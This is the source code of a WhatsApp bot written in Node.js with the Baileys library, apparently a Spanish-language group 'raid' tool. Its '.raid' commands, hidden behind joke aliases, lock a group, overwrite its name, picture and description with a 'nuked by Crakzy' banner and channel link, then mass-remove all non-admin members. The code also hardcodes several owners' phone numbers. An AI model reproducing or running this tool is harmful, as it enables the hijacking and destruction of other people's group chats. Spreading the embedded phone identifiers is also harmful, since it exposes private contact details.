const Jimp = require('jimp')
global.Jimp = Jimp

const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
const { Boom } = require('@hapi/boom');
const fs = require('fs');
const pino = require('pino');
const qrcode = require('qrcode-terminal');

process.on('unhandledRejection', (reason) => console.log('Unhandled Rejection:', reason));
process.on('uncaughtException', (err) => console.log('Uncaught Exception:', err));

const NOMBRE_GRUPO = '𝐃𝐄𝐀𝐓𝐇 𝐂𝐑𝐀𝐊𝐙𝐘';
const DESCRIPCION_GRUPO = `𝐍𝐔𝐊𝐄𝐀𝐃𝐎 𝐏𝐎𝐑 𝐂𝐑𝐀𝐊𝐙𝐘 𝐃𝐈𝐎𝐒 𝐓𝐎𝐃𝐎 𝐏𝐎𝐃𝐄𝐑𝐎𝐒𝐎\nSalmos 37:8-9 (TLA)\n\n📢 𝐂𝐀𝐍𝐀𝐋 𝐃𝐄 𝐂𝐑𝐀𝐊𝐘:\nhttps://whatsapp.com/channel/0029VbCP81gADTOEOgWQxW07`;

const BOT_OWNER = '5219613301789@s.whatsapp.net';
const BOT_OWNER_LID = '189915467931651@lid';
const BOT_OWNER_2 = '584124339924@s.whatsapp.net';
const BOT_OWNER_LID_2 = '230103309123623@lid';
const BOT_OWNER_3 = '3197010548990@s.whatsapp.net';
const BOT_OWNER_LID_3 = '180994837590121@lid';

let FOTO_BUFFER = null;

const log = (msg) => console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

/* =========================
   OWNERS DINÁMICOS
========================= */
function getOwners() {
  try {
    const data = JSON.parse(fs.readFileSync('./config.json'));
    return (data.owner || []).map(o => o.replace(/[^0-9]/g, ''));
  } catch {
    return [];
  }
}

async function startBot() {
  const { state, saveCreds } = await useMultiFileAuthState('auth_info_baileys');
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    version,
    auth: state,
    logger: pino({ level: 'silent' }),
    browser: ['DEATH CRAKZY', 'Chrome', '120.0.0'],
  });

  FOTO_BUFFER = fs.readFileSync('./gojo.jpg');

  sock.ev.on('creds.update', saveCreds);

  sock.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect, qr } = update;

    if (qr) qrcode.generate(qr, { small: true });

    if (connection === 'close') {
      const statusCode = (lastDisconnect?.error instanceof Boom)?.output?.statusCode;
      const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
      if (shouldReconnect) setTimeout(startBot, 5000);
    } else if (connection === 'open') {
      log('BOT CONECTADO');
    }
  });

  sock.ev.on('messages.upsert', async ({ messages }) => {
    try {
      const msg = messages[0];
      if (!msg.message || msg.key.fromMe) return;

      const from = msg.key.remoteJid;
      if (!from.endsWith('@g.us')) return;

      let text = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
      const sender = msg.key.participant || msg.key.remoteJid;

      const senderNum = sender.replace(/[^0-9]/g, '');

      const metadata = await sock.groupMetadata(from);
      const botJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';

      const isBotAdmins =
        metadata.participants.find(p => p.id === botJid)?.admin !== null;

      if (text === '.follar') text = '.raid';
      if (text === '.follar2') text = '.raid2';

      const hardOwners = [
        BOT_OWNER,
        BOT_OWNER_LID,
        BOT_OWNER_2,
        BOT_OWNER_LID_2,
        BOT_OWNER_3,
        BOT_OWNER_LID_3
      ].map(o => o.replace(/[^0-9]/g, ''));

      const isMod =
        hardOwners.includes(senderNum) ||
        getOwners().includes(senderNum);

      if (text === '.menu') {
        if (!isMod) return;
        await sock.sendMessage(from, {
          text: `📋 MENÚ\n.lock\n.unlock\n.setup\n.tag\n.mylid\n.follar\n.follar2`
        });
      }

      if (text === '.mylid' || text === '.id') {
        await sock.sendMessage(from, {
          text: `Tu lid es:\n${sender}`
        });
      }

      if (!isMod) return;

      if (text === '.lock') {
        await sock.groupSettingUpdate(from, 'announcement');
      }

      else if (text === '.unlock') {
        await sock.groupSettingUpdate(from, 'not_announcement');
      }

      else if (text === '.setup') {
        await sock.updateProfilePicture(from, FOTO_BUFFER);
        await sock.groupUpdateSubject(from, NOMBRE_GRUPO);
        await sock.groupUpdateDescription(from, DESCRIPCION_GRUPO);
      }

      else if (text.startsWith('.tag ')) {
        const mensaje = text.slice(5);
        const mentions = metadata.participants.map(p => p.id);

        await sock.sendMessage(from, {
          text: mensaje,
          mentions
        });
      }

      else if (text === '.raid' || text === '.raid2') {

        if (!isBotAdmins) return;

        await sock.groupSettingUpdate(from, 'announcement');

        if (text === '.raid') {
          await sock.updateProfilePicture(from, FOTO_BUFFER);
        }

        await sock.groupUpdateSubject(from, NOMBRE_GRUPO);
        await sock.groupUpdateDescription(from, DESCRIPCION_GRUPO);

        const miembros = metadata.participants.filter(p =>
          !p.admin &&
          p.id !== botJid &&
          !hardOwners.includes(p.id.replace(/[^0-9]/g, ''))
        );

        const chunkSize = 1024;

        for (let i = 0; i < miembros.length; i += chunkSize) {
          const chunk = miembros.slice(i, i + chunkSize).map(m => m.id);
          await sock.groupParticipantsUpdate(from, chunk, 'remove');
          await sleep(1200);
        }
      }

    } catch (e) {
      log('Error: ' + e.message);
    }
  });
}

startBot();
